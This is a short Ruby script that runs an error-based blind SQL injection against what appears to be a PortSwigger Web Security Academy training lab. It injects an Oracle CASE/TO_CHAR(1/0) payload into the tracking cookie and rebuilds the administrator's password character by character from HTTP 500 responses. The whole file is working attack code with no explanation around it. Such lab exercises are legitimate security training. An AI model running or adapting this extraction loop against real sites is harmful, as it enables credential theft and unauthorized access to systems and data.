# frozen_string_literal: true

require 'uri'
require 'net/http'

TARGET = 'https://0a7b009e03f23f80c26048db00bb00a3.web-security-academy.net/'

uri = URI(TARGET)

def get_res(req:, uri: URI(TARGET))
  Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
    http.request(req)
  end
end

req = Net::HTTP::Get.new(uri)
res = get_res(req: req)
cookies = res['set-cookie'].split(';')
tracker = cookies[0]

chars = ('a'..'z').to_a + ('0'..'9').to_a + ('A'..'Z').to_a
password = ''

i = 1
j = 0
while j < chars.length
  c = chars[j]
  j += 1
  # Oracle case
  payload = "' AND (SELECT CASE WHEN (SUBSTR(password, #{i}, 1) = '#{c}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users " \
  "WHERE username = 'administrator')='a"

  cookies[0] = "#{tracker}#{payload}"
  req['Cookie'] = cookies.join(';')

  puts "Testing password: #{password + c}"
  res = get_res(req: req)

  next unless res.code == '500'

  password += c
  j = 0
  i += 1
end

puts "Password: #{password}"
